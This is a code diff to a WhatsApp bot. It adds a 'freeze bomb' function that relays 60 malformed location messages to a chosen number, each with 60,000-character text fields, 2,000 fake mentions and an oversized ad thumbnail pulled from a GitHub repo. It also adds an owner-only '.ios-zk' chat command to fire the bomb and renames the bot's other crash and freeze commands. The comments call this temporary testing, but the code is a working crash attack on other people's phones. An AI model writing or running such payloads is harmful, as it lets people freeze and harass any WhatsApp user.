@@ -2622,6 +2622,46 @@ async function sendCrashmsgProbe(prim, target) {
     return { sent };
 }
 
+// 🧪 TEMPORARY probe: "iosZLoc" from the free Squichy repo (DEVPRIMIS/
+// Squichy-free). Location-message freeze bomb: 60k-char location name, 2000
+// fake mentioned JIDs, externalAdReply with 60k advertiserName/caption and
+// the original 2.5MB bug.jpg ad thumbnail. One call = 60 back-to-back
+// payloads (relay options kept empty — stock Baileys has no participant flag).
+async function sendIoszkProbe(prim, target, thumbBuf) {
+    const mentionedJid = Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`);
+    for (let z = 0; z < 60; z++) {
+        await prim.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    locationMessage: {
+                        degreesLatitude: 21.1266,
+                        degreesLongitude: -11.8199,
+                        name: `🧪⃟꙰。⌁.Bug ? ¿` + "𑇂𑆴𝑆𝑆".repeat(60000),
+                        url: 'https://t.me/dsprimis',
+                        contextInfo: {
+                            mentionedJid,
+                            externalAdReply: {
+                                quotedAd: {
+                                    advertiserName: "𑇂𝑆𝑆".repeat(60000),
+                                    mediaType: 'IMAGE',
+                                    jpegThumbnail: thumbBuf,
+                                    caption: "𑇂𝑆𝑆".repeat(60000)
+                                },
+                                placeholderKey: {
+                                    remoteJid: '0s.whatsapp.net',
+                                    fromMe: false,
+                                    id: 'ABCDEF1234567890'
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }, {});
+    }
+    return { sent: 60 };
+}
+
 const CRASHCLICK_STATIC = {
     messageContextInfo: {
         deviceListMetadata: {},
@@ -4975,7 +5015,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
-        // Pause Supabase session sync for the burst (same as .crash-invis/.frz-oom).
+        // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
         const dSyncPause = isSupabaseEnabled();
         if (dSyncPause) setSyncPaused(true);
         let dSent = 0;
@@ -5051,7 +5091,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
-        // Pause Supabase session sync for the burst (same as .crash-invis/.frz-oom).
+        // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
         const cmSyncPause = isSupabaseEnabled();
         if (cmSyncPause) setSyncPaused(true);
         let cmRoundsDone = 0, cmSent = 0;
@@ -5069,6 +5109,74 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             await safeWaReply(sock, remoteJid, `❌ .andro-nuke sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
         } finally {
             if (cmSyncPause) setSyncPaused(false);
+        }
+        return;
+    }
+
+    // 🧪 TEMPORARY `.ios-zk <number>` — the iosZLoc location/mention freeze
+    // bomb from the free Squichy repo. Owner/dev only; one run = 60 payloads
+    // back-to-back. The 2.5MB ad thumbnail is fetched once per run from the
+    // free repo (falls back to a tiny placeholder if unreachable).
+    const isIoszkCommand = cisFirstWord === '.ios-zk' || cisFirstWord === `${cisPrefix}ios-zk`;
+    if (isIoszkCommand) {
+        const zkSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
+        const zkIsOwner = fromMe || (
+            !!sock.user?.id &&
+            jidNormalizedUser(zkSenderJid) === jidNormalizedUser(sock.user.id)
+        );
+        if (!zkIsOwner && !isDevNumber(zkSenderJid)) {
+            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
+            return;
+        }
+
+        const zkUsage = '🧪 *IOS-ZK USAGE*\n\n• .ios-zk <number> — 60-shot location/mention bomb';
+        const zkParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
+        if (zkParts.length !== 1) {
+            await safeWaReply(sock, remoteJid, zkUsage, msg);
+            return;
+        }
+        const zkNumber = zkParts[0].replace(/\D/g, '');
+        if (!/^\+?[\d\s-]+$/.test(zkParts[0]) || zkNumber.length < 8 || zkNumber.length > 15) {
+            await safeWaReply(sock, remoteJid, zkUsage, msg);
+            return;
+        }
+
+        // Safety: the bot's OWN number can never be a target.
+        const zkBotNum = String(phoneNumber || '').replace(/\D/g, '')
+            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+        if (zkNumber === zkBotNum) {
+            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+            return;
+        }
+
+        const zkTargetJid = `${zkNumber}@s.whatsapp.net`;
+        try {
+            const [waCheck] = await sock.onWhatsApp(zkTargetJid);
+            if (!waCheck?.exists) {
+                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${zkNumber}`, msg);
+                return;
+            }
+        } catch (_) { /* lookup failed — try the send anyway */ }
+
+        // Hoist the 2.5MB ad thumbnail once per run.
+        let zkThumb = Buffer.alloc(0);
+        try {
+            const res = await fetch('https://raw.githubusercontent.com/DEVPRIMIS/Squichy-free/main/Squichy%20Free%20(Bot)/Func/bug.jpg');
+            if (res.ok) zkThumb = Buffer.from(await res.arrayBuffer());
+        } catch (_) {}
+        log('TEST', `${phoneNumber}: .ios-zk start → ${zkTargetJid} (thumb ${zkThumb.length}B)`);
+
+        const zkSyncPause = isSupabaseEnabled();
+        if (zkSyncPause) setSyncPaused(true);
+        try {
+            const r = await sendIoszkProbe(sock, zkTargetJid, zkThumb);
+            log('TEST', `${phoneNumber}: .ios-zk done: ${r.sent} payloads → ${zkTargetJid}`);
+            await safeWaReply(sock, remoteJid, `🧪 .ios-zk sent ${r.sent} payloads (thumb ${zkThumb.length}B) → ${zkNumber}`, msg);
+        } catch (err) {
+            logError('TEST', `${phoneNumber}: .ios-zk failed`, err);
+            await safeWaReply(sock, remoteJid, `❌ .ios-zk failed: ${err?.message || err}`, msg);
+        } finally {
+            if (zkSyncPause) setSyncPaused(false);
         }
         return;
     }
@@ -7014,16 +7122,16 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 TEMPORARY .crash-invis / .frz-oom — sandbox payloads (owner/dev only;
+    // 🧪 TEMPORARY .crash-hard / .frz-oom — sandbox payloads (owner/dev only;
     // delete with the other test commands when antibug testing ends).
-    //   ".crash-invis <number>" → androz FLOOD (default ×200); flood variants of
+    //   ".crash-hard <number>" → androz FLOOD (default ×200); flood variants of
     //   the one-shots live on .crash-iosd/.frz-iosd (see their own block). Case-insensitive. The bot's OWN number is
     //   rejected as a target — firing at it would bomb the bot's own phone.
-    const isCiaCommand = token === '.crash-invis';
+    const isCiaCommand = token === '.crash-hard';
     const isFiaCommand = token === '.frz-oom';
     if (isCiaCommand || isFiaCommand) {
         const payloadKind = isFiaCommand ? 'testfff' : 'androz';
-        const displayKind = isFiaCommand ? 'frz-oom' : 'crash-invis';
+        const displayKind = isFiaCommand ? 'frz-oom' : 'crash-hard';
         // Owner / dev only.
         if (!isSenderOwner && !isDevNumber(senderJid)) {
             await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
@@ -7048,7 +7156,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         }
 
-        // Bare .crash-invis/.frz-oom (no target) → usage help only. Never fire bare.
+        // Bare .crash-hard/.frz-oom (no target) → usage help only. Never fire bare.
         // fire at the current chat by accident.
         if (!targetInput) {
             await safeWaReply(sock, remoteJid,
